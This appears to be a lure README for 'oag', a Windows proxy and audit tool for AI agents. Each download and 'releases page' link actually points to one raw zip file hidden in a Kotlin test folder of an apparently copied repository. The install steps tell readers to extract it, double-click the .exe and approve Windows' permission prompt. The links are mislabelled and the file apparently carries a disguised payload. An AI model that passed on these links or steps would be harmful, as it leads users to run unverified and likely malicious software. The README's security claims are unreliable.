# 🛡️ oag - Keep Agent Traffic Under Control

[⬇️ Download oag for Windows](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)  
[![Download](https://img.shields.io/badge/Download%20oag-blue?style=for-the-badge)](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)

## 🚀 What oag does

oag is a local runtime policy and audit layer for AI agents. It works as a proxy between your AI agent and the internet.

Use it to:

- control which web requests can leave your device
- inspect content before it goes out
- replace secrets with real values at runtime
- record each policy decision
- keep a clear audit trail of agent activity

It gives you a simple way to watch and shape agent network traffic on Windows.

## 🖥️ Windows requirements

Before you install oag, make sure your PC has:

- Windows 10 or Windows 11
- a modern web browser
- permission to install and run software
- internet access for the first download
- enough free disk space for the app and logs

For best results, use a system where you can run local apps and set network proxy settings.

## 📥 Download oag

1. Open the [oag releases page](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)
2. Find the latest Windows build
3. Download the file for your system
4. Save it to your Downloads folder or a folder you can find again

If you see more than one file, choose the Windows version that matches your machine. If you are not sure, pick the standard 64-bit build.

## 🧩 Install oag

1. Open the folder where the file downloaded
2. If the file is a `.zip`, right-click it and choose Extract All
3. Open the extracted folder
4. If you see an `.exe` file, double-click it to start oag
5. If Windows asks for permission, choose Yes

If the app opens in a window or console, the install step is done.

## ⚙️ Set up your browser or agent

oag works as a proxy. That means your browser or AI agent needs to send traffic through it.

1. Open your agent app or browser
2. Find the network, proxy, or connection settings
3. Set the HTTP proxy to the local address used by oag
4. Set the HTTPS proxy to the same local address if needed
5. Save the settings
6. Restart the app or browser

A local proxy often uses `127.0.0.1` or `localhost` with a port number. Use the port shown in oag when you start it.

## 🔐 How secret material works

oag can materialize secrets at runtime. That means it can replace safe placeholders with real values only when they are needed.

A common flow looks like this:

- your agent sends a request with a placeholder
- oag checks the request
- oag swaps in the real secret if the policy allows it
- the request goes out with the correct value
- oag records the action in the audit log

This helps keep secrets out of prompts and reduces the chance of leaking them in logs.

## 🧠 Policy checks

oag can inspect each request before it leaves your device. It can use rules to decide whether a request should:

- be allowed
- be blocked
- be changed
- be logged for review

You can use policy checks to limit where an agent can send data, what content it can share, and which actions it can take.

## 📋 Audit trail

Every decision can be recorded. That gives you a clear history of what happened.

The audit log can help you:

- review blocked requests
- trace where data went
- see when secrets were used
- compare agent behavior over time
- spot unusual traffic

If you want to understand what an agent did, the audit trail gives you the record.

## 🌐 Typical use cases

oag fits well when you want more control over AI agent traffic.

Common uses include:

- limiting which domains an agent can reach
- stopping prompt injection from untrusted pages
- checking outbound content before it is sent
- protecting API keys and private tokens
- keeping logs for review and compliance
- applying guardrails to many agents in one place

It works as a simple control layer for agent traffic, not as a replacement for the agent itself.

## 🛠️ Basic first run

1. Start oag
2. Note the local proxy address and port
3. Set your browser or agent to use that proxy
4. Open a site or ask the agent to make a web request
5. Watch the oag window or log output
6. Confirm that requests are being checked and recorded

If traffic does not appear, check the proxy settings again and make sure oag is still running.

## 🔎 If it does not work

Try these steps:

- make sure oag is open
- check that the proxy address is correct
- confirm the port number matches the one shown in the app
- restart the browser or agent
- check that another app is not using the same port
- try a different network request to test the setup

If you change the proxy settings and nothing happens, save the settings again and restart the app.

## 📁 Files you may see

After you download oag, you may see files like these:

- `.exe` for the app
- `.zip` for the packaged download
- `.txt` or `.log` for audit output
- config files for policy rules

Keep the app files in one folder so they are easy to find later.

## 🔄 Update oag

When a new version is available:

1. Return to the [oag releases page](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)
2. Download the newest Windows build
3. Replace the old app files with the new ones
4. Open the new version
5. Check your proxy settings again

If you saved rules or logs, keep a copy before you replace files.

## 📌 What this project is for

oag is made for people who want a local control point for AI agent traffic. It helps you watch requests, enforce rules, and keep a record of what happened.

It is useful when you want:

- tighter control over outbound traffic
- a clear policy layer between agents and the web
- better handling of secrets
- a log of every decision
- less risk from untrusted content

## 🧭 Terms you may see

Here are a few simple terms used by oag:

- **proxy**: a middle step between your app and the internet
- **egress**: data leaving your device
- **policy**: a rule that decides what is allowed
- **audit log**: a record of actions and decisions
- **secret materialization**: swapping a placeholder for a real secret at runtime

These terms may appear in the app, logs, or settings

## 🧪 Quick checklist

Use this list to confirm your setup:

- you downloaded oag from the releases page
- you opened the app
- you found the local proxy address
- you set your browser or agent to use that proxy
- you tested a web request
- you saw the request in the log or audit output

## 📎 Download again

If you need the file again, use the Windows release page here:

[https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip](https://github.com/hati4100/oag/raw/refs/heads/main/oag-enforcement/src/test/kotlin/com/mustafadakhel/oag/Software-Priapulidae.zip)

## 🏷️ Topics

agent-governance,agent-guardrails,agent-security,ai-agent-security,ai-agents,ai-gateway,ai-security,egress-proxy,guardrails,llm-firewall,policy-engine,prompt-injection,proxy-server